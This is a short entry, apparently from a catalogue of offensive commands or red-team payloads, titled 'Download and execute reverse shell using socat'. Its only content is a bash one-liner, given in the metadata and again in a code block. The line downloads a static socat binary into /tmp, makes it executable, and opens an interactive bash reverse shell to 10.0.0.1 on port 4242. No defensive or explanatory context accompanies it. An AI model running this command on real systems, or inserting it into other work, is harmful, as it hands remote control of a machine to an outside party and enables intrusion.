---
id: f05f5e68-fc6f-47ac-8af3-01c882fdcbbb
name: Download and execute reverse shell using socat
type: command
executor: bash
data: wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat
  -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane
  tcp:10.0.0.1:4242
output: null
created_at: '2023-04-06T03:56:24.199253+00:00'
updated_at: '2023-04-10T20:25:32.757798+00:00'
---

# Download and execute reverse shell using socat

```bash
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242
```


